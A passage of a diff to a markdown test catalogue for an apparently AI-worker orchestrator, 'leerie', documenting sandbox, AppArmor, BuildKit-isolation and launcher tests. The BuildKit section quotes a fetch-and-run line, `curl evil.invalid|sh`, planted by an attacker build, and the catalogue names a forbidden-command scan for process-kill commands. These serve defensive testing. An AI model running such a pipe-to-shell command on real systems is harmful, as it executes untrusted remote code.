 extracts under `LEERIE_STATE_HOST_DIR` (or `USER_REPO/.leerie` by default)
 and `run.json` (its `no_push` included) arrives unchanged, as from
-`fetch-branch.sh`; `.leerie/config.toml` and
-`.leerie/Dockerfile` stream back when the host has neither, are never
-clobbered when the host already has one, and are non-fatal when absent on the
-instance; and both `aws` and `ssh` appear in the transport log while `flyctl`
+`fetch-branch.sh`; neither the instance's `.leerie/config.toml` nor
+its `.leerie/Dockerfile` is streamed back, and a recorded capture is named,
+not applied; and both `aws` and `ssh` appear in the transport log while `flyctl`
 never does.
 
 ## EC2 launch/attach transport
@@ -2459,6 +2922,25 @@ one requirement and unsafe where it disables the mechanism, so the
 prescribed-command check reads it anchored, a prescribed command is never
 stripped or exempted, and a stripped paraphrase of one is resynthesised
 exactly.
+
+`tests/test_heredoc_scan_agrees_with_bash.py` (4 test functions, 25 cases;
+DESIGN §9 *Post-work conformance*, the forbidden-command scan's
+here-document rule; review round 30 isolation H1) is a differential test
+against `bash -c` itself, never a list of expected splits: each form runs in
+real bash under an empty `PATH`, with `pkill`, `kill`, `pgrep`, `cat` and
+`npx` as shell functions that mark what ran, and the scan's verdict
+(`_process_kill_hit`, `_forbidden_command_hit`) must be a hit exactly when
+bash runs the marked command. Its forms: round 30's twelve that hid a
+command bash ran (a `<<` in a comment, in `$((…))` or `((…))`, in a
+parameter expansion, an ANSI-C quoted delimiter, a `case` `)` inside a
+body's substitution, …), the same shapes nearby, controls that are bodies
+bash does read (quoted, unquoted, `<<-`), and the whole-suite scan's forms,
+the live 0.43.0 shape among them; `test_the_forms_are_what_bash_says_they_are` checks the forms
+themselves against bash, and the one deliberate disagreement is pinned
+alone: a body the scan cannot prove (no terminating line) is read as
+commands — a false denial, never a missed command. With the commit's
+parent's `leerie.py` 7 of the 25 fail; with the rule as this commit had it before
+review round 30's fold, 17.
 
 ## Pre-push preflight probe
 
@@ -3149,7 +3631,12 @@ catch (`test_warns_when_the_cached_ref_is_stale`, falsified live: removing the
 fetch fails 4 tests). Bounded at `timeout 5`, throttled to once per 24h via an
 mtime stamp in the state dir (same convention as `.dockerfile-hash`), and
 warn-only — a detached HEAD, no upstream, a non-git prefix, or an unreachable
-remote must all stay silent and never fail a run.
+remote must all stay silent and never fail a run. Its harness (the file
+has 18 functions, 18 cases) sources the
+real `scripts/remote/_log.sh` (`LOG_SH_SOURCE`) before its own `remote_log`:
+since review round 32 (execution X3) the guard names the upstream version
+through `_terminal_safe`, and without it the two warning tests failed on
+`_terminal_safe: command not found`.
 
 ## Plan checkpoints: snapshot aliasing
 
@@ -4649,8 +5136,9 @@ stubbed, and the stubs write files the way the workers would.
   resume-idempotent on `gate.final`.
 - **Cross-run**: the residual reaches `_prior_delivery_residual` as
   `acceptance_unmet`, and the planner prompt carries guidance for it.
-- **Hiding**: `_acceptance_read_denials` adds the `Read` deny for implementer
-  and conformer only, and `claude_p` wires it.
+- **Hiding**: no fixer's grant (`_worker_grants`: implementer, conformer,
+  surrogate_fixer, falsifier) reaches the sets or any run file that records
+  them, and no worker's argv carries a `Read(` deny.
 - **Order**: in `_run_phases`, audit → acceptance write → plan, and
   delivery recheck → acceptance gate → finalize.
 
@@ -4658,8 +5146,11 @@ Falsified five ways, each turning at least one test red: repair at the
 conformer's own effort; no hidden sets; no rollback; keeping
 non-discriminating defect files; no Read deny.
 `tests/test_repo_write_denial.py` now asserts the write deny's presence rather
-than its position (the acceptance Read deny follows it for implementer and
-conformer), and the registry tests (`test_resolve_models`,
+than its position, and (since the CLI `Read` denies went, Landlock refusing
+those reads instead: `tests/test_worker_confinement.py::test_no_fixer_reads_what_records_a_held_out_set`)
+that no `Read(` deny is on the argv, for a judgment worker and an
+implementer — both cases fail with the denies back, and the implementer's
+old assertion of `/acceptance/**` was red from that change on; the registry tests (`test_resolve_models`,
 `test_resolve_efforts`) list the new worker.
 
 ## No work on executed evidence, with a bounded dispute (2026-10-04)
@@ -5529,6 +6020,59 @@ usage, and a PATH with no `python3` yields one error line and exit 1 rather
 than a fall-through to the run path. Six of the eight tests fail against the
 pre-change launcher.
 
+## Launcher end to end against a stub `nerdctl`: keepalive, signals, `--`, top level
+
+`tests/launcher_stub_run.py` runs the real launcher with a stub `nerdctl`
+(shell builtins and absolute paths only) whose `run` records its argv and
+"runs the container" as a `sleep` that `kill` ends. Every process a launch
+starts carries a unique `LEERIE_TEST_MARK`, and each test kills whatever
+still carries it in `finally`. The world, not the host, decides the
+launcher's AppArmor gate: a stub `cat` answers the three files the probes
+read (the LSM list, the loaded profiles' names, the installed profile; their
+paths read from `scripts/runtime-install.sh`) from the world, and passes
+every other `cat` to the real one. `make_world(apparmor=)` is `current`
+(the default), `none` or `stale`.
+
+- `tests/test_launcher_stage_keepalive.py` (review round 26 M1): with stdout
+  on a pipe, the reader gets EOF within 15 s of the launcher's exit and no
+  marked process is left. The keepalive as shipped, sent TERM, takes its
+  `sleep` with it.
+- `tests/test_launcher_signal_stops_run.py` (review round 27 O1): TERM and
+  INT to the launcher during a 300 s container exit 143 / 130 within 20 s,
+  after `nerdctl kill`, with the client gone and the cidfile removed. A
+  TERM in the created window (the cidfile written, the task not started)
+  ends the launcher with 143 within 5 s, and the container never starts.
+- `tests/test_launcher_double_dash.py` (review round 27 O3): `--no-push --
+  <task>` for `-task`, `--no-push` and `--state-dir` hands the container
+  every flag before `--` and `-- <task>` last. `-- --no-push` is a task, not
+  a push opt-out. A source rule requires every top-level `for arg in "$@"`
+  scan to handle `--`.
+- `tests/test_launcher_repo_top_level.py` (review round 27 O4): from
+  `<repo>/sub`, `/work` is the top level, `USER_REPO` its name, and the
+  default state dir is keyed and owned by it. A relative task file and
+  `--answers` under `sub/` reach the container as `sub/...`, and a task file
+  only at the top level is not found from `sub/`. At the top level nothing
+  is rewritten.
+
+Twelve of these fourteen tests fail against the previous launcher, each on
+its own defect (output is written to a file, not a pipe, so the keepalive's
+orphan cannot time out the others). The two that pass on both are controls:
+the missing task file from `sub/`, and nothing rewritten at the top level.
+
+`tests/test_launcher_stub_run_apparmor.py` (4 tests) drives each world state
+through the real launcher and its real probes: `current` hands `nerdctl run`
+`seccomp=unconfined` and `apparmor=leerie-container`, `none` only the
+first, `stale` stops with "not loaded (or is stale)" before `nerdctl run`,
+and an unknown state is refused. Before the stub, every test running the
+launcher through this harness read the host's securityfs and
+`/etc/apparmor.d/`, and passed only where the loaded profile was this
+checkout's. Measured 2026-11-03 on a host whose loaded profile was older:
+13 of the harness's 16 tests (the four files above and the relay test in
+`tests/test_terminal_text.py`) failed, every one that reaches the gate.
+With the stub's call removed, 3 of the 4 fail on that host (`current`,
+`none`, the refusal); the states disagree, so on any host at least two
+fail.
+
 ## Launcher `list` / `--report` host path and bash 3.2 parse
 
 `tests/test_launcher_readonly_host_path.py` runs the real launcher against a
@@ -5885,7 +6429,7 @@ lookup bypassed, the `tmp` removal dropped, an empty `_CLAUDE_CONFIG_SKIP`,
 directories copied instead of linked, the template left writable, and the
 template kept at finalize.
 
-`tests/test_confined_cli_env.py` (7 tests, DESIGN §6 *Every confined CLI is
+`tests/test_confined_cli_env.py` (8 tests, DESIGN §6 *Every confined CLI is
 given its own directories, by one builder*; review round 22 exec H2). The
 rule: every function that derives a CLI's grant or builds its argv
 (`_worker_grants`, `_contained_claude_argv`, in `leerie.py` and
@@ -5902,7 +6446,12 @@ smoke test's environment dropped (the stub's `mkdir` fails as in the
 finding), `claude_p`'s old hand-built four variables, and the old
 `worker-guard.py`. A real smoke test (`claude` 2.1.316 in `leerie:r22`,
 rootless, `apparmor=leerie-container`) passed with the fix and died with the
-finding's EROFS without it.
+finding's EROFS without it. A worker's TMPDIR is
+`PRIVATE_TMP_ROOT/<16 hex>`, 0700, registered for removal at the process's
+exit, granted, and removed by `_remove_worker_dirs`; a tsx-shaped
+`<TMPDIR>/tsx-<uid>/<pid>.pipe` binds as an AF_UNIX socket from a run
+directory as deep as the container's (DESIGN §6 *A worker's temp directory
+is short and private too*).
 
 ## The CLI's own git, transcripts apart, and a run that died (review round 22)
 
@@ -5966,7 +6515,7 @@ resolver stays `done` with no `failed_at`; a run with work left lists
 
 ## Run choices on resume, and a phase-1 death resumes (review round 23)
 
-`tests/test_run_choices_on_resume.py` (34 tests, DESIGN §6 *A resumed run
+`tests/test_run_choices_on_resume.py` (38 tests, DESIGN §6 *A resumed run
 continues under the choices it was started with*; review round 23 exec, run
 A′). Real `main()` runs a fresh run (`--no-push`, a cap, a per-worker model
 and effort, a skip flag, `--source-of-truth`) through the real `_run_phases`
@@ -5995,6 +6544,16 @@ tests, review round 24 L2): the launcher's real bare-resume block reads the
 run `resolve_run_id` picks, over three runs whose records disagree; the
 picked record beats the ambient env; nothing to pick falls back to env; a
 remote runtime does not pick host-side.
+`TestRunJsonNoPushHasOneWriter` (4 tests, review round 25 F3):
+`run.json.no_push` has one writer, `_record_run_push_choice`, which writes
+the run's push choice or `true` while the run has nothing to push. A plain
+resume of a no-work run whose choice is push keeps `no_push` true; a
+control with work left takes the choice; by rule (AST), only that function
+calls `_write_run_json` with `no_push`, and only `_finish_no_work_run`,
+`main` and `phase_finalize` call it; `_run_has_nothing_to_push` holds for
+the `done:` terminal phases and not otherwise. Restoring `main()`'s direct
+`_write_run_json(st.run_dir, no_push=bool(args.no_push))` turns the no-work
+resume and the rule red.
 
 `tests/test_resume_after_phase1_death.py` (5 tests, DESIGN §6 *Resumable
 planning*, *The first phase is a phase like any other*; review round 23
@@ -6059,7 +6618,11 @@ sample's probe never counts for the next.
   environment entry `main()` installs before anything spawns
   (`_git_hooks_off`; it round-trips and keeps the operator's own
   `GIT_CONFIG_*` entries), and only a worker's spawn takes it back out
-  (`_git_hooks_on` in `_invoke`). Real git with every hook installed: the
+  (`_git_hooks_on` in `_invoke`). The order is checked as the property, not
+  a position: the call precedes `_become_subreaper`, and nothing before it
+  in `main()` reaches a process-starting call through the module's
+  functions (the position pin broke when `_guard_terminal_streams()` went
+  first; with the call moved after `_become_subreaper` the test fails). Real git with every hook installed: the
   I2 bracket's put-back and every git form leerie uses fire none, and every
   script leerie runs turns hooks off itself (`leerie_git_hooks_off`), also
   when run outside the orchestrator.
@@ -6239,14 +6802,26 @@ sample's probe never counts for the next.
   hard-linked file in a worker's `node_modules` nor a committed
   `postinstall` reaches the store or a view. Driven with a pnpm-like
   stand-in installer.
-- `tests/test_worker_confinement.py` (20 tests, DESIGN §6 *A worker writes
-  only where it is granted (I5)*): a real child confined by
+- `tests/test_worker_confinement.py` (23 test functions, 27 cases, DESIGN
+  §6 *A worker writes only where it is granted (I5)*): a real child confined by
   `scripts/landlock_exec.py` with the grants `_worker_grants` derives, on
   leerie's run layout, writes only its grant and reads nothing of the run
   it is not given; the writes notice is rendered from that grant
   (`_confined_writes_notice`), every path it names writable under the
   shim, and `claude_p` appends it to a worker with a shell (review round
-  18 M9).
+  18 M9). Every fixer (4 cases) is refused by the kernel each file that
+  records a held-out set, a shell `cat` included, which is why those CLI
+  `Read` denies are gone. A read-only worker in a subtask tree reads that
+  tree's own repository (`<run>/tree-repos/<tree>/`), so its `git` works
+  there, and writes nothing of it. No confined process, a worker or a
+  measurement (2 cases), can open or list the host's build slots
+  (`LEERIE_HOST_DIR`), while what lies beside that directory is read; the
+  worker case grants the test's `tmp_path` through `_apart`, as conftest's
+  `_test_tmp_readable_by_measurements` does for the measurement case,
+  because a worker's grants never name `/tmp`, where pytest puts
+  `tmp_path` — without it the worker case read nothing beside the host
+  directory and passed only with `TMPDIR` beneath `$HOME`. With `_host_dir()`
+  returning None both cases fail.
 - `tests/test_run_settings.py` (54 tests, review rounds 17 H2 and 18 H1,
   DESIGN §8 *The settings are leerie's*): both checker halves and both
   restore halves. A setting written from a worker's tree (each key DESIGN
@@ -6376,25 +6951,45 @@ sample's probe never counts for the next.
     end with it.
   - Leerie's own temp directory is in the run directory, and `_run_phases`
     moves it first.
-- `tests/test_exec_lock.py` (15 test functions, 16 cases; DESIGN §6 *A held-out evaluation
-  runs alone, in a world that dies with it (I3)*, the time half): an
-  evaluation runs with no measurement beside it and waits for running ones
-  without starving; it waits for a running real `_invoke` worker, and a
-  worker asked for meanwhile starts after it; a worker spawned inside an
-  evaluation stops the run before spawning; a cancelled worker and a
-  cancelled waiter release the lock; sections nest, a shared holder's own
-  commands pass through a waiting evaluation, and an evaluation inside a
-  shared hold stops the run; the host level makes an evaluation wait for
-  another process's shared holder and holds later shared takers behind it,
-  and releases both files; by rule over the module nothing reachable inside
-  `_held_out_section` spawns a worker or waits on a raw semaphore or lock
-  a shared holder may hold — stopping at the three gates that pass
+- `tests/test_exec_lock.py` (19 test functions, 21 cases; DESIGN §6 *A
+  held-out evaluation runs alone, in a world that dies with it (I3)*, the
+  time half; *The run's execution lock, then a host build slot,
+  everywhere*): an evaluation runs with no measurement beside it and waits
+  for running ones without starving; it waits for a running real `_invoke`
+  worker, and a worker asked for meanwhile starts after it; a worker
+  spawned inside an evaluation stops the run before spawning; a cancelled
+  worker and a cancelled waiter release the lock; sections nest, a shared
+  holder's own commands pass through a waiting evaluation, and an
+  evaluation inside a shared hold stops the run; two runs' locks never
+  block each other (the lock has no host level), and an evaluation that
+  must wait logs what it waits for and how long it waited, one that need
+  not logs nothing. By rule over the module, nothing reachable inside
+  `_held_out_section` spawns a worker or waits on a raw semaphore, lock or
+  second slot a shared holder may hold — stopping at the gates that pass
   through inside an exclusive hold (`_blt_slot`, `_build_class_slot`,
-  `_confirm_hold`) — with the rule's own catch of planted violations and
-  its acceptance of the gates; the gates entered inside an exclusive hold
-  while another task holds each raw resource pass through, and the same
-  entry outside one waits (the two arms disagree); and every shared holder
-  takes the lock after its semaphores.
+  `_confirm_hold`, and a nested `_held_out_section`) — with the rule's own
+  catch of planted violations and its acceptance of the gates; the gates
+  entered inside an exclusive hold while another holder has each raw
+  resource pass through, and the same entry outside one waits (the two arms
+  disagree); every shared holder takes the lock after its semaphores; and
+  nothing reachable inside a `_build_class_slot` hold takes a second slot,
+  a section, a semaphore or a worker (one build, one slot, by rule: this
+  replaced the `_BUILD_SLOT_HELD` flag). The order (review round 31,
+  isolation E1, execution 5): an evaluation takes its host slot once it
+  holds the lock exclusive (with the host's one slot held by another run it
+  waits holding the exclusive; with it free it enters at once — 2 cases),
+  a command takes its slot inside its shared hold, also when it already
+  holds the lock shared (round 30's order stopped the run there), and an
+  evaluation waiting for its run's workers holds no slot, so another run
+  (another event loop) gets the host's one slot at once. Falsified against
+  the round-30 order, 4 cases fail: the build-slot rule, the other two
+  order tests, and the first one's slot-held case (its slot-free case
+  passes either way; the slot-held case waited forever on a starter that
+  died, and now bounds that wait). Both cases of the pass-through test
+  hang against that order.
+  `tests/test_build_peak_sizing.py::test_slots_are_shared_through_the_host_dir`
+  is unchanged but for its comment: its two holders now each hold the
+  run's lock shared, then a slot.
 - `tests/test_falsifier_exec_queue.py` (3 test functions, 5 cases;
   DESIGN §6 *Evaluations queue on the lock itself*, review round 21
   execution M1): the real `_falsify_items`, `_falsifier_gates`,
@@ -6626,14 +7221,15 @@ sample's probe never counts for the next.
   every other call below 460 allowed, a foreign architecture killed, x32
   refused), aarch64's numbers, the real filter on the host, Node's worker
   threads under it, and no table being a refusal.
-- `tests/test_launcher_secopt.py` (12 tests; replaces
+- `tests/test_launcher_secopt.py` (13 tests; replaces
   `tests/test_rootless_seccomp.py`): the launcher's `SECOPT`/`APPARMOR_OPT`
   block executed with the runtime stubbed (seccomp unconfined on every
   runtime; the profile applied when loaded; a missing one stopping the
   launcher without a terminal or with `--no-runtime-install`), both
   expanded in the run argv, `scripts/runtime-install.sh`'s AppArmor
   helpers with the kernel stubbed, and the profile compiled
-  (`apparmor_parser -Q`) with its mount rules.
+  (`apparmor_parser -Q`) with its mount rules and every allow rule of the
+  released 0.43.0 profile.
 - `tests/test_runtime_probes_pipefail.py` (11 test functions, 39 cases;
   DESIGN §6 *The launcher's detection gives the kernel's answer*, review
   r22 H1): the REAL `runtime_has_apparmor`/`runtime_apparmor_current` (and
@@ -6714,8 +7310,8 @@ sample's probe never counts for the next.
   broker started by `cgroup-broker.py --spawn` with its v2 root at
   `$R21_CG_SLICE` (a container harness run as root, dropping to leerie as
   `container-entry.sh` does); skips otherwise.
-- `tests/test_worker_commands_cannot_reach_the_cli.py` (8 test functions,
-  9 cases; DESIGN §6 *A worker's commands cannot reach its CLI*, review
+- `tests/test_worker_commands_cannot_reach_the_cli.py` (12 test functions,
+  13 cases; DESIGN §6 *A worker's commands cannot reach its CLI*, review
   round 21 isolation R4): with a stand-in CLI that runs
   `CLAUDE_CODE_SHELL_PREFIX` as the real one does (the shim, grants,
   `_invoke`, transcript registry and readers real), code a worker runs
@@ -6723,7 +7319,312 @@ sample's probe never counts for the next.
   `/proc/<cli>/fd/1` (2 cases: unisolated and isolated, the latter skipped
   where the host cannot build a sandbox); a settings prefix below
   leerie's `--settings` cannot unset leerie's shell; settings layers merge
-  in the CLI's order; a malformed settings file is logged and left out; a
-  confined worker reads no settings file; the host seam is untouched;
-  `scripts/worker-shell.py` fails closed (126) where it cannot nest, and
-  runs a command as `bash` would.
+  in the CLI's order; no settings layer below leerie's widens a worker's
+  tools — a lower layer gives only `permissions.deny`/`ask` and the
+  keep-list below: the operator's `defaultMode`/`allow` and a checkout
+  layer's are dropped, and
+  so are `additionalDirectories`, an operator PreToolUse hook answering
+  "allow", `enableAllProjectMcpServers`, `statusLine` and any other `env`
+  name, while leerie's own hook stays (DESIGN §6 *The CLI reads no settings
+  file*); a malformed settings file is logged and left out; a
+  confined worker reads no settings file; the host seam reads only the
+  operator's user settings (`--setting-sources user`) and gets no shell
+  prefix; `scripts/worker-shell.py` fails closed (126) where it cannot nest, and
+  runs a command as `bash` would. The keep-list (review rounds 31 and 32,
+  execution 3 and X4) is the endpoint, the credentials and the model
+  mapping: from the operator's untracked settings file every one of these
+  CLI names reaches the worker — the four credential helpers
+  `apiKeyHelper`, `awsCredentialExport`, `awsAuthRefresh`,
+  `gcpAuthRefresh`; the API's, Bedrock's and Vertex's base URLs, switches
+  and skip-auth switches; Foundry's switch, skip-auth switch, base URL,
+  resource and key; the key and token; `ANTHROPIC_CUSTOM_HEADERS`;
+  Vertex's project, region and a `VERTEX_REGION_CLAUDE_*` name;
+  `ANTHROPIC_DEFAULT_{SONNET,OPUS,HAIKU,FABLE}_MODEL`,
+  `ANTHROPIC_SMALL_FAST_MODEL` and its AWS region; `AWS_*` — while
+  `otelHeadersHelper`, `NODE_OPTIONS`, a host path
+  (`CLAUDE_CODE_CLIENT_CERT`, `ANTHROPIC_UNIX_SOCKET`) and
+  `CLAUDE_CODE_OAUTH_TOKEN` do not, and a tracked settings file sets none
+  of them. The first fails against the round-30 list, and against the
+  round-31 list (no `ANTHROPIC_CUSTOM_HEADERS`, no Foundry name); the
+  second passes there too (a guard: the tracked file was never read).
+
+## The orchestrator's root is leerie's; a capture names packages and managers (review round 28, isolation E1, E2, A2)
+
+- `tests/test_worker_root_view.py` — the shim's worker view. Unit: the
+  worker stage's environment changes (`worker_env_changes`,
+  `apply_worker_env`), a linked env file is not read, `_parse`'s
+  `--worker-root`/`--cli` rules, an AST rule that `chroot` happens only in
+  `enter_worker_view`, called only from `_before_exec` in the forked
+  children of `run`/`run_as_init` after `_confine_or_126`, and that
+  `worker-shell.py` nests before it enters the view; `_is_leeries_hook`.
+  Isolation (container battery; skips where the host restricts user
+  namespaces): a small worker root built from this root's `sh`, `bash`,
+  `cat`, `env`, `grep` and their libraries, with a mark, an environment and
+  an `/etc/ld.so.preload` trap. A confined command and a held-out runner run
+  in it with no capability; a `--cli` process stays in leerie's root
+  holding only `CAP_SYS_CHROOT`, its `worker-shell.py` commands run in the
+  view, leerie's hook does not, and no trap complaint reaches the shim.
+  Falsified: without the `import warnings` at the shim's top, `os.execvp`
+  imported it in the child after it entered the view (two failures).
+- `tests/test_repo_image_dockerfile.py` (18 functions, 79 cases, 2 of
+  them opt-in) — the repository image's two builds (DESIGN §6 *One image,
+  two roots*), from the launcher's own helpers, verbatim. `_repo_image_wrap` writes leerie's Dockerfile with no
+  repository text, its final stage `FROM <base>` and one `COPY` to
+  `/opt/leerie-worker-root/`; a linked Dockerfile is refused; an image that
+  is not the base's layers plus one with the base's configuration is
+  removed (7 cases). `build_repo_image`, with a builtins-only `nerdctl`,
+  gives the first build the repository's bytes unchanged, no `--target`,
+  the committed context and an OCI-layout destination, and the second only
+  leerie's file with the layout as the `leerie-worker` named context, for
+  each shape review rounds 32 and 33 found the rewrite diverging on (13
+  cases: `$((1<<N))`, `<<<`, `${X//a/b}`, `${X:1:2}` and `${X:?m}` before a
+  heredoc whose body holds a `FROM`, lower-case instructions under
+  `# check=error=true`, a BOM before a directive and before a `FROM`,
+  `` # escape=` ``, a `\x1c` before `<<EOF`, `# syntax=`, an open heredoc,
+  an open continuation); `_repo_layout_digest` takes a layout holding
+  exactly one image and nothing else. The build context and the image key
+  (review round 30 isolation R1, DESIGN §6 *A repository image is the one
+  built from what it reads*): the context is exactly what the instructions
+  read (COPY/ADD sources, ONBUILD's, a RUN bind mount's, `.dockerignore`)
+  and the extracted files are those; the key moves when a read file changes
+  and not when another does; the local key and the Fly tag carry the
+  context digest; each source form (`.`, `$VAR`, a wildcard before or in
+  the last part, JSON form, `..`, an absent file, ONBUILD, a bind mount
+  with and without a source, a cache mount) names its context; a
+  whole-tree COPY keys on the whole tree. The lexing that makes the context
+  (review round 31, execution 6): a tab after the instruction word or a
+  flag, an empty, comment or whitespace-only line inside a continuation, a
+  continuation joined with no separator, `# escape=`; a source through a
+  committed link reads the link and what it names, a link leaving the tree
+  adds nothing past itself. Heredocs (review rounds 32 and 33): a `<<` that
+  BuildKit does not read as one — `$((1<<SHIFT))`, `<<<hello`, `'<<x'`,
+  `"a <<x b"`, `a\<<x`, `x<<y`, a JSON-form `RUN`, a `\x1c` before `<<EOF`
+  (Go's whitespace) — leaves the next `COPY` in the context (8 cases); a
+  heredoc's delimiter is read as BuildKit reads it — `END-OF`, `'END OF'`,
+  `"E.O.F"`, `E'O'F`, `<<-`, `0<<`, two on one line, and a line carrying
+  `${X//a/b}`, `${X/a/b}`, `${X:1:2}`, `${X:?m}` or `${X##*/}` — so a
+  `COPY` in its body names nothing (12 cases); the parser directives
+  (round 32 X2, round 33 F3): `escape` sets the continuation, a comment, a
+  blank line or an unknown key ends the directives, a BOM is dropped once,
+  lower case is read (7 cases). Falsified live against mutations of the
+  final tree, each restored: the repository's bytes written with a header
+  line (13 of 13 bytes cases fail), a `--target` on the first build (14
+  fail across this file and `test_build_repo_image.py`), Python's
+  `isspace` in `shell_words` (the `\x1c` case), no BOM strip (2), the old
+  `${...}` modifier refusals (4), a layout of more than one image accepted
+  (1), a line added to leerie's file (1). Opt-in
+  (`LEERIE_TEST_REPO_IMAGE=<base>`, real `nerdctl build`s through
+  `build_repo_image`): a two-stage repository file, lower case under
+  `# check=error=true` with a decoy `FROM` in a heredoc, passes
+  `_check_repo_image`, and its worker root is the final stage (its file
+  and environment, the first stage's file only as copied, nothing at the
+  image's own root); E1's planted `.pth` is in the worker root and never
+  runs in the image root's interpreter, as leerie or root, and the
+  untracked `.env` is not in the image.
+- `tests/test_buildkit_isolation.py` (26 functions, 53 cases, 12 of them
+  opt-in: 6 real builds, and 6 under bash 3.2): no build consumes what
+  another build left in BuildKit, every
+  build is given leerie's frontend, and a repository image's build
+  directory lives only as long as its launch, which no build outlives
+  (DESIGN §6, *No build consumes what another build left in BuildKit*, *A
+  repository's parser directives are its own build's; its frontend is
+  leerie's*, *A repository image's build directory lives only as long as
+  its launch*; review round 34, isolation R1, R2 and its observation, and
+  execution R34E-1; review round 35, isolation I1, execution R35E-2 and
+  claims R1; review round 36, isolation I2, execution X1 and X2; review
+  round 37, isolation I3 and I4). From the launcher's own text:
+  `_repo_image_prepare` dates every context entry (the root, a file, a
+  committed link itself) at one time in the past year, never the commit's,
+  and differently on each export, with the same key. Every build is given
+  `--no-cache` and `--build-arg BUILDKIT_SYNTAX=` the one pinned frontend
+  (`LEERIE_DOCKERFILE_FRONTEND`, `docker/dockerfile:1@sha256:<64 hex>`):
+  the base build, both of `build_repo_image`'s, the three builds of a
+  generated file whose language-dep layer fails (the layer's, then the
+  apt-only file's two), and `build-push.sh` on the remote builder and on
+  `--local-build` (2). The frontend is pulled into the namespace
+  BuildKit's worker reads before the base build and before a repository
+  build, and `ensure_frontend_in_worker_ns` pulls only when absent and
+  warns on a failed pull (3). `build-push.sh` refuses a caller's `BUILDKIT_SYNTAX` on
+  either builder (2). Derived from the build sites: each of the launcher's
+  3 `nerdctl build` commands names the pin, and each of `build-push.sh`'s
+  2 builds passes `build_arg_flags`, which both builders start with it.
+  Every build is also given `--build-arg BUILDKIT_CACHE_MOUNT_NS=`: derived
+  from the same sites, each launcher site names a variable drawn from
+  `leerie_cache_mount_ns` with its failure handled, and both builders'
+  `build_arg_flags` name it; run, the base build, both of
+  `build_repo_image`'s, the generated file's three and each builder twice
+  are given 10 namespaces, each `leerie-<32 hex>`, no two alike. With no
+  random bytes, `leerie_cache_mount_ns` prints nothing and returns 1, and
+  `build_repo_image` fails before any build. `build-push.sh` refuses
+  `BUILDKIT_CACHE_MOUNT_NS` (`NAME=v`, `--build-arg=NAME=v`, bare, lower
+  case) and a lower- or mixed-case `BUILDKIT_SYNTAX` on either builder
+  (12). The build directory is `b.<launcher pid>.<random>`.
+  `_sweep_stale_builds` removes a dead launcher's entry (a directory, a
+  file, a link, whose target survives) and any entry untouched for a day,
+  and keeps a live launcher's and a fresh one with no PID. The launcher's
+  text after the base build runs the sweep. A real SIGTERM or SIGHUP to
+  the launcher's shell while `build_repo_image`'s first build blocks (a
+  builtins-only `nerdctl`) leaves no build directory, and the shell dies
+  of the signal (2). A SIGTERM to the launcher's PID alone, then the
+  blocked build released to export its layout: nothing writes the build
+  directory again, and the build's process is gone. All three `$STAGE`
+  EXIT traps, as written, remove a live build directory on a TERM.
+  `_build_job` with the launcher's EXIT trap, on a pty (`setsid --ctty`)
+  unless stated, under bash and, with `LEERIE_TEST_BASH32=<path>`, a bash
+  3.2 (12): the terminal's ^C, a SIGTERM and a SIGHUP to the launcher's
+  PID, and ^C with the output piped to `cat` under `tostop`, each kill the
+  launcher by that signal (the piped one reports status 130), end the
+  build's own child and leave no directory, which the released build does
+  not write again; under `tostop`, and with no controlling terminal, the
+  build's output arrives and its status 3 comes back.
+  Opt-in (`LEERIE_TEST_BUILDKIT_ISOLATION=1`): a buildkitd the test starts
+  in the rootless containerd's namespaces, with its own root, socket and
+  containerd namespace, all removed afterwards, including the
+  `<ns>_history` namespace BuildKit writes. On it: the two-branch
+  reproduction through `build_repo_image` (main's worker root holds main's
+  bytes); a cache mount repository A planted reads empty in repository B's
+  build; leerie's base build, after another build ran its step through a
+  proxy, holds no proxy; repository A, whose `# syntax=` names the official
+  frontend behind a wrapper that drops `no-cache`, reads nothing of the
+  private file repository V's build put in a cache mount; two repository
+  builds through `build_repo_image` overlapping on it (attacker A's 40
+  short cache-mount steps running inside victim V's 25 s step, which the
+  steps' own clocks must show) share no mount either way: A's image holds
+  nothing of V's committed file and V's step installs `clean`; and, after
+  the fixture's daemon is pruned and the frontend's image removed,
+  `ensure_frontend_in_worker_ns` and then a second buildkitd on the
+  same namespace with an empty root and its registry behind a closed
+  proxy port build with the pin (an image it does not hold fails there at
+  the proxy). Round 34, falsified live (measured 2026-11-03): its 12
+  default cases failed at its parent tree, and its 3 opt-in cases there
+  too (main held `curl evil.invalid|sh #xyz`, B read `planted-by-A`, the
+  base held the attacker's proxy); 14 mutations of its final tree each
+  failed their cases. Round 35, falsified live (measured 2026-11-03):
+  against the parent tree (plus `scripts/dockerfile-frontend.sh`, so the
+  harnesses load), every case this round added or changed fails except
+  the digest's form and the pull's own unit cases, which the mutations
+  below cover; at the parent the opt-in I1 case's A read V's file, and
+  with the pull removed the offline case failed to resolve the frontend at
+  the closed proxy. Against the final tree, each of 13 mutations failed the
+  cases it targets, each restored: the pin dropped from the first build,
+  the wrap, the base, the remote builder or `--local-build`; the caller
+  refusal removed; the pull dropped before the base build, at the build
+  decision, or from `ensure_frontend_in_buildkit_ns`; `_build_job_end`
+  dropped from `_repo_build_done`; the build run in the foreground; the
+  local run's trap without `_repo_build_done`; and the fallback recorded
+  under its own file's key (in `test_build_repo_image.py`). Round 36,
+  falsified live (measured 2026-11-03), each mutation restored: the
+  namespace dropped from the base build, the wrap, the remote builder or
+  `--local-build`; one value reused for both of `build_repo_image`'s
+  builds; the guard on its first draw removed; the helper's length check
+  removed; the namespace dropped from `build-push.sh`'s refusal, and
+  `nocasematch` dropped from it; each fails the cases it targets.
+  `trap '' TTOU TTIN` dropped from the job fails `tostop` under both
+  shells, and the INT trap dropped fails bash 3.2's `ctrl-c` (exit 129) and
+  `piped-ctrl-c` (status 129). The opt-in overlapping-builds case, run
+  with the namespace dropped from `build_repo_image`'s first build: the
+  steps overlapped and A's image held V's committed file. All 6 opt-in
+  real cases passed on that tree (BuildKit 0.31.2, rootless nerdctl 2.3.5).
+  Round 37 (DESIGN §6 *No build consumes what another build left in
+  BuildKit*, *The image store*; *A repository's build carries no operator
+  credential*). Every harness that runs a repository build defines a
+  builtins-only `buildctl` (`tests/conftest.py`'s `BUILDCTL_STUB`: one
+  containerd worker reading `$STUB_WORKER_NS`, default `default`), so no
+  test asks the host's daemon. Derived from the scripts: every nerdctl
+  command in the launcher and `scripts/dockerfile-frontend.sh` starts with
+  `--namespace`, naming `LEERIE_IMAGE_NS` (16 commands: build, image, kill,
+  run, save) or one of six other spellings, each for its stated reason;
+  the run's two quoted forms and prune's probe name it; `build-push.sh`'s
